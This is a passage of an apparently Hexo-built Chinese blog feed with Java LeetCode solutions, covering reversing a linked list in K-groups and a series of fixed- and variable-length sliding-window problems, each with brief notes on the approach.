<h3 id="K个一组反转链表（非hot100）"><a href="#K个一组反转链表（非hot100）" class="headerlink" title="K个一组反转链表（非hot100）"></a>K个一组反转链表（非hot100）</h3><p>思路：递归+记录反转部分前面部分 + dummyNode</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">end</span> <span class="operator">=</span> dummy;</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="keyword">while</span> (end.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k &amp;&amp; end != <span class="literal">null</span>; i++) &#123;</span><br><span class="line">                end = end.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(end == <span class="literal">null</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">reverseEnd</span> <span class="operator">=</span> pre.next;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> end.next;</span><br><span class="line">            end.next = <span class="literal">null</span>;</span><br><span class="line">            pre.next = reverseNode(pre.next);</span><br><span class="line">            reverseEnd.next = next;</span><br><span class="line">            pre = reverseEnd;</span><br><span class="line">            end = pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode <span class="title function_">reverseNode</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">curNext</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            cur.next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = curNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_滑动窗口</title>
    <url>/2024/07/28/leetcode-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/0viNMK/">分享丨【题单】滑动窗口（定长&#x2F;不定长&#x2F;多指针） - 力扣（LeetCode）</a></p>
<span id="more"></span>

<p>[toc]</p>
<h1 id="定长滑动窗口"><a href="#定长滑动窗口" class="headerlink" title="定长滑动窗口"></a>定长滑动窗口</h1><h3 id="1456-定长子串中元音的最大数目"><a href="#1456-定长子串中元音的最大数目" class="headerlink" title="1456. 定长子串中元音的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-vowels-in-a-substring-of-given-length/">1456. 定长子串中元音的最大数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口裸题</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxVowels</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;a&#x27;</span> || ch == <span class="string">&#x27;e&#x27;</span> || ch == <span class="string">&#x27;i&#x27;</span> || ch == <span class="string">&#x27;o&#x27;</span> || ch == <span class="string">&#x27;u&#x27;</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res = count;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;a&#x27;</span> || ch == <span class="string">&#x27;e&#x27;</span> || ch == <span class="string">&#x27;i&#x27;</span> || ch == <span class="string">&#x27;o&#x27;</span> || ch == <span class="string">&#x27;u&#x27;</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        ch = s.charAt(i - k);</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;a&#x27;</span> || ch == <span class="string">&#x27;e&#x27;</span> || ch == <span class="string">&#x27;i&#x27;</span> || ch == <span class="string">&#x27;o&#x27;</span> || ch == <span class="string">&#x27;u&#x27;</span>)&#123;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Integer.max(res,count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2269-找到一个数字的-K-美丽值"><a href="#2269-找到一个数字的-K-美丽值" class="headerlink" title="2269. 找到一个数字的 K 美丽值"></a><a href="https://leetcode.cn/problems/find-the-k-beauty-of-a-number/">2269. 找到一个数字的 K 美丽值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">divisorSubstrings</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> (<span class="type">int</span>) Math.pow(<span class="number">10</span>, k);</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> num;</span><br><span class="line">        <span class="keyword">while</span> (x &gt;= m / <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curNum</span> <span class="operator">=</span> x % m;</span><br><span class="line">            <span class="keyword">if</span> (curNum &gt; <span class="number">0</span> &amp;&amp; num % curNum == <span class="number">0</span>) res++;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1984-学生分数的最小差值"><a href="#1984-学生分数的最小差值" class="headerlink" title="1984. 学生分数的最小差值"></a><a href="https://leetcode.cn/problems/minimum-difference-between-highest-and-lowest-of-k-scores/">1984. 学生分数的最小差值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序计算</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumDifference</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(k == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - k + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            res = Integer.min(res, nums[i + k - <span class="number">1</span>] - nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1343-大小为-K-且平均值大于等于阈值的子数组数目"><a href="#1343-大小为-K-且平均值大于等于阈值的子数组数目" class="headerlink" title="1343. 大小为 K 且平均值大于等于阈值的子数组数目"></a><a href="https://leetcode.cn/problems/number-of-sub-arrays-of-size-k-and-average-greater-than-or-equal-to-threshold/">1343. 大小为 K 且平均值大于等于阈值的子数组数目</a></h3><p>定长滑动窗口裸题，简单难度</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numOfSubarrays</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> k, <span class="type">int</span> threshold)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">            <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (threshold * k &lt;= sum) res++;</span><br><span class="line">            sum -= arr[i -k + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2090-半径为-k-的子数组平均值"><a href="#2090-半径为-k-的子数组平均值" class="headerlink" title="2090. 半径为 k 的子数组平均值"></a><a href="https://leetcode.cn/problems/k-radius-subarray-averages/">2090. 半径为 k 的子数组平均值</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getAverages(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(res, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">1</span> &gt; n) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k * <span class="number">2</span> + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        res[k] = (<span class="type">int</span>) (sum / (k * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k + <span class="number">1</span>; i + k &lt; n; i++) &#123;</span><br><span class="line">            sum += nums[i + k];</span><br><span class="line">            sum -= nums[i - k - <span class="number">1</span>];</span><br><span class="line">            res[i] = (<span class="type">int</span>) (sum / (k * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2841-几乎唯一子数组的最大和"><a href="#2841-几乎唯一子数组的最大和" class="headerlink" title="2841. 几乎唯一子数组的最大和"></a><a href="https://leetcode.cn/problems/maximum-sum-of-almost-unique-subarray/">2841. 几乎唯一子数组的最大和</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maxSum</span><span class="params">(List&lt;Integer&gt; nums, <span class="type">int</span> m, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            map.merge(nums.get(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">            sum += nums.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (map.size() &gt;= m) res = sum;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; n; i++) &#123;</span><br><span class="line">            sum += nums.get(i);</span><br><span class="line">            sum -= nums.get(i - k);</span><br><span class="line">            map.merge(nums.get(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">            map.merge(nums.get(i - k), -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span> (map.get(nums.get(i - k)) == <span class="number">0</span>) &#123;</span><br><span class="line">                map.remove(nums.get(i - k));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (map.size() &gt;= m) &#123;</span><br><span class="line">                res = Long.max(res, sum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2461-长度为-K-子数组中的最大和"><a href="#2461-长度为-K-子数组中的最大和" class="headerlink" title="2461. 长度为 K 子数组中的最大和"></a><a href="https://leetcode.cn/problems/maximum-sum-of-distinct-subarrays-with-length-k/">2461. 长度为 K 子数组中的最大和</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumSubarraySum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            map.merge(nums[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(map.size() == k) res = sum;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; n; i++) &#123;</span><br><span class="line">            sum += nums[i] - nums[i - k];</span><br><span class="line">            map.merge(nums[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            map.merge(nums[i - k], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span>(map.get(nums[i - k]) == <span class="number">0</span>)&#123;</span><br><span class="line">                map.remove(nums[i - k]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(map.size() == k) res = Long.max(res, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2134-最少交换次数来组合所有的-1-II"><a href="#2134-最少交换次数来组合所有的-1-II" class="headerlink" title="2134. 最少交换次数来组合所有的 1 II"></a><a href="https://leetcode.cn/problems/minimum-swaps-to-group-all-1s-together-ii/">2134. 最少交换次数来组合所有的 1 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录一的个数k，记录在k的个数范围内最多一的数字。然后相减即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSwaps</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (<span class="type">int</span>) Arrays.stream(nums).filter(num -&gt; num == <span class="number">1</span>).count();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (n == k) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//记录长为n的连续数组1的最大数量</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            count += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        maxVal = count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            count -= nums[i - <span class="number">1</span>];</span><br><span class="line">            count += nums[(i + k - <span class="number">1</span>) % n];</span><br><span class="line">            maxVal = Integer.max(maxVal, count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> k - maxVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2653-滑动子数组的美丽值"><a href="#2653-滑动子数组的美丽值" class="headerlink" title="2653. 滑动子数组的美丽值"></a><a href="https://leetcode.cn/problems/sliding-subarray-beauty/">2653. 滑动子数组的美丽值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口但要统计窗口第x小整数。</span><br><span class="line">看数据范围，发现数字很小，直接用桶记录，然后获取第x小整数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getSubarrayBeauty(<span class="type">int</span>[] nums, <span class="type">int</span> k, <span class="type">int</span> x) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LEFT</span> <span class="operator">=</span> -<span class="number">50</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RIGHT</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[RIGHT - LEFT + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            bucket[nums[i] - LEFT]++;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> LEFT; j &lt;= RIGHT; j++) &#123;</span><br><span class="line">                cnt += bucket[j - LEFT];</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= x) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(j &lt; <span class="number">0</span> ) res[i - k + <span class="number">1</span>] = j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bucket[nums[i - k + <span class="number">1</span>] - LEFT]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2156-查找给定哈希值的子串"><a href="#2156-查找给定哈希值的子串" class="headerlink" title="2156. 查找给定哈希值的子串"></a><a href="https://leetcode.cn/problems/find-substring-with-given-hash-value/">2156. 查找给定哈希值的子串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一眼滑动窗口，但关键是找到递推关系</span><br><span class="line"></span><br><span class="line">正顺推的话需要求逆元，但是题目没有说p、m互斥，因此需要倒着推，就不需要逆元了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">subStrHash</span><span class="params">(String s, <span class="type">int</span> power, <span class="type">int</span> modulo, <span class="type">int</span> k, <span class="type">int</span> hashValue)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">targetIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">curHash</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">curMulNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - k; i &lt; n; i++) &#123;</span><br><span class="line">            curHash += (s.charAt(i) - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>) * curMulNum;</span><br><span class="line">            curHash %= modulo;</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) &#123;</span><br><span class="line">                curMulNum *= power;</span><br><span class="line">                curMulNum %= modulo;</span><br><span class="line">                curHash %= modulo;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (curHash == hashValue) targetIndex = n - k;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - k - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            curHash -= (s.charAt(i + k) - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>) * curMulNum;</span><br><span class="line">            curHash = power * curHash % modulo;</span><br><span class="line">            <span class="keyword">if</span>(curHash &lt; <span class="number">0</span>) curHash += modulo;</span><br><span class="line">            curHash += s.charAt(i) - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>;</span><br><span class="line">            curHash %= modulo;</span><br><span class="line">            <span class="keyword">if</span> (curHash == hashValue) &#123;</span><br><span class="line">                targetIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(targetIndex, targetIndex + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2953-统计完全子字符串"><a href="#2953-统计完全子字符串" class="headerlink" title="2953. 统计完全子字符串"></a><a href="https://leetcode.cn/problems/count-complete-substrings/">2953. 统计完全子字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分组 + 滑窗</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countCompleteSubstrings</span><span class="params">(String word, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word.length(), i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; Math.abs(word.charAt(i) - word.charAt(i - <span class="number">1</span>)) &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i - start &lt; k) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">charTypeCount</span> <span class="operator">=</span> <span class="number">1</span>; charTypeCount &lt;= <span class="number">26</span>; charTypeCount++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> start;</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> start;</span><br><span class="line">                <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="keyword">while</span> (left &lt; i) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (right &lt; i &amp;&amp; count &lt; charTypeCount) &#123;</span><br><span class="line">                        map.merge(word.charAt(right), <span class="number">1</span>, Integer::sum);</span><br><span class="line">                        <span class="keyword">if</span> (map.get(word.charAt(right)) == k) &#123;</span><br><span class="line">                            count++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        right++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(count &lt; charTypeCount) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(right - left == charTypeCount * k) res++;</span><br><span class="line">                    map.merge(word.charAt(left), -<span class="number">1</span>, Integer::sum);</span><br><span class="line">                    <span class="keyword">if</span>(map.get(word.charAt(left)) == k - <span class="number">1</span>) count--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="不定长滑动窗口（求最长-x2F-最大"><a href="#不定长滑动窗口（求最长-x2F-最大" class="headerlink" title="不定长滑动窗口（求最长&#x2F;最大)"></a>不定长滑动窗口（求最长&#x2F;最大)</h1><h3 id="1493-删掉一个元素以后全为-1-的最长子数组"><a href="#1493-删掉一个元素以后全为-1-的最长子数组" class="headerlink" title="1493. 删掉一个元素以后全为 1 的最长子数组"></a><a href="https://leetcode.cn/problems/longest-subarray-of-1s-after-deleting-one-element/">1493. 删掉一个元素以后全为 1 的最长子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">滑动窗口，移动右边满足条件继续移动，直到不满足条件在移动左边</span><br></pre></td></tr></table></figure>

<p>代码</p>
